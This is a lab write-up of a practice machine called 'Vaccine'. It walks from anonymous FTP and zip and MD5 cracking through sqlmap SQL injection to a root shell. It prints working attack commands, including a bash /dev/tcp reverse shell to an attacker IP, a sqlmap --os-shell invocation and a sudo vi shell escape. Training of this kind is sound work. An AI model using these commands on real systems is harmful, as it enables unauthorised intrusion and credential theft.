Vaccine

Anonymous FTP login leaks a password-protected zip, cracked with zip2john and john. MD5 hash in source code gives web access, then sqlmap OS shell via SQLi. Root through a vi GTFOBins escape on a misconfigured sudo rule.

Recon

Started with a standard Nmap scan.

bash
nmap -sV -sC 10.129.2.223
21FTP
22SSH
80HTTP

Port 80 served a web login page. Default credentials didn't work. Port 21 was more interesting.

FTP & Zip Cracking

FTP allowed anonymous login and contained a single file: backup.zip.

bash
ftp 10.129.2.223
# Login: anonymous / (blank)
get backup.zip

The zip was password-protected. Used zip2john to extract the hash, then cracked it with john.

bash
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
john backup.hash --show
Password cracked

Zip password: 741852963

Extracted the archive and found index.php. Inside, the login logic compared the submitted password against a hardcoded MD5 hash.

php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")

Cracked the MD5 hash using an online lookup.

Admin credentials recovered

admin : qwerty789

Web Login

Logged into the site with the recovered credentials. The dashboard showed a car catalogue with a search function. The search query was reflected directly in the URL as ?search=, a strong hint at SQL injection.

Foothold — SQLi OS Shell

Used sqlmap with the session cookie to confirm and exploit the injection.

bash
sqlmap -u "http://10.129.2.223/dashboard.php?search=any" \
  --cookie="PHPSESSID=<your_session_cookie>" \
  --os-shell
GET parameter 'search' confirmed injectable

sqlmap landed an OS shell. Upgraded to a proper reverse shell:

bash
# On attacker — set up listener
nc -lvnp 443

# In sqlmap OS shell — send reverse shell
bash -c "bash -i >& /dev/tcp/10.10.16.29/443 0>&1"

Got a shell as postgres. Upgraded it to a full TTY:

bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
Note on session stability

The machine kicked us if we strayed too far from the expected working directory. Moving quickly to exfil credentials and SSH in for a stable session was the right call.

Found plaintext database credentials in /var/www/html/dashboard.php:

php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
Credentials found

postgres : P@s5w0rd!

Used them to SSH in for a stable session before getting kicked.

bash
ssh postgres@10.129.2.223

Privilege Escalation, sudo + vi GTFOBins

Checked SUID binaries, nothing useful. Moved on to sudo permissions.

bash
sudo -l
Sudo rule found

postgres could run /bin/vi /etc/postgresql/11/main/pg_hba.conf as root.

Opened the file with sudo vi, then used the GTFOBins vi escape to spawn a root shell from within the editor.

bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
vi
# Inside vi:
:set shell=/bin/bash
:shell
Root shell

Takeaways

Key lessons
  • Always test FTP for anonymous login, it's a common oversight that leaks sensitive files
  • Source code in backup archives often contains hardcoded credentials or hashes worth cracking
  • Web apps running on a database server almost always store credentials in plaintext in /var/www/html, check there first for privesc
  • Any sudo rule allowing a text editor can be escaped via GTFOBins, vi, nano, less, and others all have shell spawning techniques
  • When a reverse shell is unstable, look for credentials immediately and SSH in for a persistent session
